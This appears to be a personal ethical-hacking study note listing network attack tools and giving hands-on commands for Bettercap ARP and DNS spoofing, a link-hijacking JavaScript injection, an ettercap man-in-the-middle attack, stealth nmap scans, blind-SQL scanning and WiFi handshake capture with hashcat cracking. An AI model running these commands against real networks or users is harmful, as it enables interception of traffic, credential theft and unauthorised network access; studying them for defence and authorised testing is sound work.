# Network-based Tools and Techniques

- Public networks like hotels, libraries, airports are the most vulnerable
- Anyone can list every device on the network and see the URLs visited
- One can even redirect the traffic to the attacker's page and steal credentials

### Common Attack Services and Protocols

|Name|
|:-:|
|RDP|
|VNC|
|SSH|
|SMNP|
|SMB|
|Telnet|
|RPC|
|SIP Server|
|NFS|
|Nginx|
|Building Control|

### Tools

- Vulnerability Scanners / Penetration Testing

|Name|Description|
|:-:|:-:|
|[Nmap](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/blob/main/network_attacks.md#nmap)|Scan networks to find live hosts / targets / services|
|[Nikto](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#nikto)|Simple and general vulnerability scanner|
|[Skipfish](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#skipfish)|Build a website map and find hidden URLs and files|
|[Wapiti](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#wapiti)|Find all vulnerabilities and exploit them from the terminal|
|[OWASP-ZAP](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#owasp-zap)|All exploitations using a GUI|
|[Xsser](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#xsser)|Super specialised XSS|
|[Nuclei](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#nuclei)|Scan website, network, DNS|
|[Trivy](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#trivy)|Scan your machine and any server|
|[Vuls](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#vuls)|Scan anything for the most recent vulnerabilities|

|Name|
|:-:|
|Kali Linux|
|Metasploit|
|[Wireshark](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#wireshark)|
|John the Ripper|
|Hashcat|
|Hydra|
|Burp Suite|
|Zed Attack Proxy|
|sqlmap|
|aircrack-ng|
|[BeEF](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/blob/main/network_attacks.md#beef)|

- Network Engineering

|Name|
|:-:|
|[SolarPUTTY](http://bit.ly/usesolarputty)|
|[WAN Killer](http://bit.ly/WANkiller)|
|[IP Address Scanner](http://bit.ly/ipscansw)|
|[Network Device Scanner](http://bit.ly/netdevicescanner)|
|[Wifi Heat Map](http://bit.ly/wifiheatmapsw)|
|[Wifi Analyzer](http://bit.ly/wifianalyzersw)|
|[SolarWinds NPM](http://bit.ly/netperfmon)|

- MITM Attacks
  - [Bettercap](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/blob/main/network_attacks.md#bettercap)
  - [ARP Poisoning & Sniffing](https://github.com/PSR009/Threat-Intelligence-and-Ethical-Hacking/edit/main/network_attacks.md#mitm-attack--sniffing-network-traffic)

- Search Engines

|Name|Description|
|:-:|:-:|
|Shodan|Search for devices connected to the internet|
|Wigle|Database of wireless networks with statistics|
|Grep App|Search across a half million git repos|
|Binary Edge|Scans the internet for Threat Intelligence|
|ONYPHE|Collects CTI data|
|GreyNoise|Search for devices connected to the internet|
|Censys|Assessing attack surface for internet connected devices|
|Hunter|Search for email addresses belonging to a website|
|Fofa|Search for various Threat Intelligence|
|ZoomEye|GAther information about targets|
|LeakIX|Search publicly indexed information|
|IntelligenceX|Search Tor, I2P, data leaks, domains and emails|
|Netlas|Search and monitor internet connected assets|
|URL Scan|Free service to scan and analyse websites|
|PublicWWW|Marketing and affiliate marketing research|
|FullHunt|Search and discovery attack surfaces|
|CRT sh|Search for certs that have been logged by CT|
|Vulners|Search vulnerabilities in a large database|
|Pulsedive|Search for Threat Intelligence|
|Packet Storm Security|Browse latest vulnerabilities and exploits|
|GrayHatWarefare|Search public S3 buckets|

## [Bettercap](https://www.bettercap.org/)

- Implements MITM attacks

Detect network devices
```
net.probe on
```
List all devices
```
net.show
```
### ARP Spoofing
- Redirects the traffic as `Target → Attacker → Router`
- HTTP websites can directly capture your credentials
```
set arp.spoof.targets <IP>
arp.spoof on
```
### Sniffing
```
net.sniff on
net.sniff off
```
### DNS Spoofing
- Redirects the victim to an attacker controlled page
- Start your attacker server `service apache2 start`
```
set dns.spoof.domains <URL>
dns.spoof on
```
### Redirecting
```js
window.onload = function() {
    console.log("Hacked website");
    anchors = document.getElementsByTagName("a");
    for (var i = 0; i < anchors.length; i++) {
        anchors[i].href = 'https://www.hackthissite.org/'; // redirect all links to this website
    }
    document.write("<h1> You have been hacked </h1>"); // modify contents of the HTTP website entirely
}
```
- Set HTTP Proxy before redirectiong
```set http.proxy.injectjs ./<your-javascript.js>
http.proxy on
```
- Turn off proxy after any changes to the script and back on for the changes to take effect

## [Nmap](https://nmap.org/)
- Network scanner - Scan networks to find live hosts / targets / services

1. Check for live systems (ping)
    ```
    $ nmap -sP <IP/24>
    ```
    - Ping 254 possible hosts at once

2. Check for open ports
    ```
    $ nmap -sT -p 80,443 <IP/24>
    ```
    - -sT: TCP connection 3-way handshake (SYN, SYN ACK, ACK) for full-open scan

3. Scan beyond IDS/Firewall
    ```
    $ nmap -sS -p
    ```
    - -sS: stealthy / SYN scan / half-open scan

4. Perform banner grabbing and OS fingerprinting
    ```
    $ nmap -O <IP>
    $ nmap -A <IP>
    ```
    - OS detections
    - Version detections
    - Script scanning
    - Traceroute 	

5. Scan for vulnerabilities
6. Draw network diagrams
7. Prepare proxies

### Others
- Decoy
    ```
    $ nmap -sS -D <decoy-IP> 
    ```
- Scripts
    ```
    $ nmap –script vuln <IP>
    ```
- Switches


## [BeEF](https://beefproject.com/)
- The Browser Exploitation Framework used for penetration testing web browsers

## [Wireshark](https://www.wireshark.org/)

- Packet Analyzer / Network Traffic Analyzer
    - Live Capture
    - Import & Export capture files
        - `.pcap` (packet capture)
            - Analyzers
                - A-Packets (Note: Uploads files to a public repo)
        - `.pcapng` (additional metadata)
    - Troubleshoot, examine, debug and learn
- Alternatives: `tshark` (Wireshark CLI), `tcpdump`
- Architecture
    - `NIC` &rarr; `PCAP` &rarr; `GUI/CLI` &rarr; `User`
- Drivers
    - Linux: `libpcap`
    - Windows: `winpcap`
    - Core Engine: `dumpcap`
- Customize Settings
    - Security Profile
    - Statistics
    - Configure GeoIP
    - Custom COlumns
    - Name Resolution
    - Export Objects in HTTP or from other protocols
- Detecting Usual and Unusual traffic
    - DNS, HTTP
    - Analyze traffic from unwanted countries
    - Filtering the suspect behavior
    - Filter the executable files
    - Analyze traffic over non-standard ports
- GUI
    - Customization
        - Create new profile like `Network Forensics`
        - Change `Time` column to display `UTC` and in `Milliseconds`
        - Add columns for `Source Port` and `Destination Port`
        - Add `Coloring Rules` from `View` menu and also give priority for these rules
    - Filters
        - Attackers encrypts traffic via `DNS` and `HTTPS`
        - DNS: Filter `Answer RRs` (Resource Records) for suspicious packets
        - TCP filters: 
            - SYN packets: `tcp.flags.syn == 1`
    - Statistics
        - Capture File Properties
        - Protocol Hierarchy: gives an attacker's network process and high-level target overview
        - Endpoints and Conversations
    - GeoIP
        - Pull endpoint information like country, city, etc.
        - Add GeoIP database: `Edit` &rarr; `Preferences` &rarr; `Name Resolution` &rarr; `MaxMind database directories`

## MITM Attack / Sniffing Network Traffic

### Tools Required
- Wireshark
- nmap
- Ettercap

### Procedure

1. Network Scanning
    ```
    sudo nmap -sn <subnet>
    ```

2. ARP Poisoning (Changing the destination MAC address on Router & Victim to put yourself in between them)
    ```
    sudo ettercap -T -S -i wlan0 -M arp:remote /<Router-IP>// /<Victim-IP>// 
    ```
    - `-T` : Text-only (not GUI)
    - `-S` : not to use SSL
    - `-i` : Interface
    - `-M` : MITM

3. Sniffing with Wireshark
    - Filters
        - `ip.addr == <Victim-IP> && http`
        - `ip.addr == <Victim-IP> && telnet`

## Vulnerability Scanners

### [Nikto](https://cirt.net/Nikto2)
- Commands
    ```
    $ nikto -host <URL>
    $ nikto -host <URL> -dbcheck
    ```
- No way to pass cookies
- Less range of attacks

### [Skipfish](https://www.kali.org/tools/skipfish/)
- Active Web Application Security Reconnaissance Tool
- Commands
    ```
    $ skipfish -o skip <URL>
    $ skipfish -o skip <URL> -C <cookie-name>=<cookie-value>
    ```
    - Get cookies from `Inspect` &uarr; `Application`
    - Example
        `PHPSESSID=<cookie-value>`
        `security=low`
- No clearview of how to exploit the website

### [Wapiti](https://wapiti-scanner.github.io/)
- Commands
    ```
    $ wapiti --list-modules
    $ wapiti -u <URL> -c cookie.json -x <URL>/logout.php --flush-attacks 
    $ wapiti -u <URL> -c cookie.json -x <URL>/logout.php --flush-attacks -m blindsql -S insane
    ```
- Flags
    - `-x` : Exclude logout page from ending the session
    - `--flush-attacks` : flush the  old attacks to execute them again
    - `-m` : Module to use
    - `-S` : Aggressive Level

### [OWASP-ZAP](https://www.zaproxy.org/)
- OWASP Zed Attack Proxy
- Procedure
    - Input cookies via GUI in `Scripts` &rarr; `<Attack-URL>` &rarr; `Authentication`
    - Launch `Spider` &rarr; `Start Scan` to enumerate every sub-URL
    - Click on `Active Scan` &rarr; `Attack`
- [Visual Step by Step Guide to Damn Vulnerable Web Application (DVWA) Authentication](https://augment1security.com/authentication/dvwa-authentication/)
- [Setting up ZAP to Test Damn Vulnerable Web App (DVWA)](https://www.zaproxy.org/faq/details/setting-up-zap-to-test-dvwa/)

### [Xsser](https://xsser.03c8.net/)
- Automatic framework to detect, exploit and report XSS vulnerabilities in web-based apps

### [Nuclei](https://nuclei.projectdiscovery.io/)
- [GitHub](https://github.com/projectdiscovery/nuclei)
- [Community Templates](https://github.com/projectdiscovery/nuclei-templates)
- Scanning for a variety of protocols, including TCP, DNS, HTTP, SSL, File, Whois, Websocket, Headless etc.
- Scan Commands
    ```
    $ nuclei -u <URL> -t nuclei-templates/technologies/
    $ nuclei -u <URLs>.txt -t nuclei-templates/technologies/
    $ nuclei -u <URLs>.txt -t nuclei-templates/misconfiguration/
    ```
- Disadvantages
    - Doesn't cover typical vulnerabilities like SQL Injection in depth
    - Authentication setup is not very intuitive

### [Trivy](https://github.com/aquasecurity/trivy)
- Targets
    - Container Image
    - Filesystem
    - Git repository (remote)
    - Kubernetes cluster or resource
- Scanners
    - OS packages and software dependencies in use (SBOM)
    - Known vulnerabilities (CVEs)
    - IaC misconfigurations
    - Sensitive information and secrets
- Scan Commands
    ```
    $ trivy image python:3.4-alpine
    $ trivy image -severity HIGH,CRITICAL python:3.4-alpine
    $ trivy fs <directory>
    $ trivy repo <URL>
    ```
- Disadvantages
    - No capabilities to add specific scans
    - Reports are a bit hard to read

### [Vuls](https://vuls.io/docs/en/tutorial-docker.html)
- Agent-less vulnerability scanner for Linux, FreeBSD, Container, WordPress, Programming language libraries, Network devices 
- [GitHub](https://github.com/future-architect/vuls)
- Configuration file
- Advantages
    - Up to date vulnerabilities database over an actual connection
    - Many reporting options
    - Scan both locally and remotely
- Disadvantages
    - Tedious setup with docker
    - Configuring the report is not easy

## Hacking WiFi passwords

1. Handshake Capture
    - Observe the handshake b/w the device and the router
    - Check the supported interface modes to monitor : `$ iw list`
    - Get name of the adapter : `$ ifconfig`
    - Turn it off : `$ ip link set <adapter-name> down`
    - Set adapter into monitoring mode : `$ sudo <adapter-name> set monitor control`
    - Turn it back on : `$ ip link set <adapter-name> up`
    - Make sure nothing intereferes with us listening
      - Stop Network Manager : `$ sudo systemctl stop NetworkManager`
      - Kill any WiFi managers : `$ sudo airmon-ng check kill`
    - Listen to WiFi network for router's BSSID using `airodump-ng` (A wireless packet capture tools for `aircrack-ng`)
      - `sudo airodump-ng <adapter-name>`
    - Capturing handshake
      - `sudo airodump-ng <adapter-name> -w wpa-capture --bssid <router-bssid> -c 1`
      - This captures the handshake to `cap` files containing password hashes
    - Attacks
      - Brute Force Attack via Hashcat
        - `hashcat` is an advanced CPU-based password recovery utility
        - Convert the `cap` to `pcap` : `editcap -F pcap <cap-file> <output-file>.pcap`
        - Transform `pcap` to hashcat format : `hcxpcapngtool -o hash.hc22000 <output-file>.pcap`
        - Attack Commad : `hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d` --show
        - A simple 10 digit password takes around 11 days on an i7
      - Dictionary Attack
        - 
    
2. Deauthenitication Attack
  - Force the handshake by knocking the devide off the router
3. RSN Attack
  - Capture the packets and brute force the router


Capture wifi handshake 
Crack wifi password using hashcat
Hashcat explained
Password hash cracking
Brute force password
Dictionary attack on password
Password lists from the darkweb
Rule based attack
Hashcat default rules
Hashcat best rules
Wifi deauthentication attack
RSN wifi attack
GCP gpus to crack passwords


#### References
YouTube
- [how Hackers SNiFF (capture) network traffic // MiTM attack](https://www.youtube.com/watch?v=-rSqbgI7oZM)
- [hacking every device on wifi / ethernet networks 1 #wifi #hack #MITM](https://www.youtube.com/watch?v=2J3idGxCbuc)
- [hacking every device on wifi / ethernet networks 2 #wifi #hack #MITM #javascript](https://www.youtube.com/watch?v=ExxxhioK1Hk)
- [3 wifi attacks and speed hash cracking with cloud GPUs](https://www.youtube.com/watch?v=MrWAJEQJZbk)
- [5 best vulnerability scanners to exploit websites - ranked + tested](https://www.youtube.com/watch?v=y6W1kc1jOkI) - Nikto, Skipfish, Wapiti, OWASP-ZAP, Xsser
- [3 Best Advanced Scanners to find exploits automatically](https://www.youtube.com/watch?v=EM_iJnWphfo&t=44s) - Nuclei, Trivy, Vuls
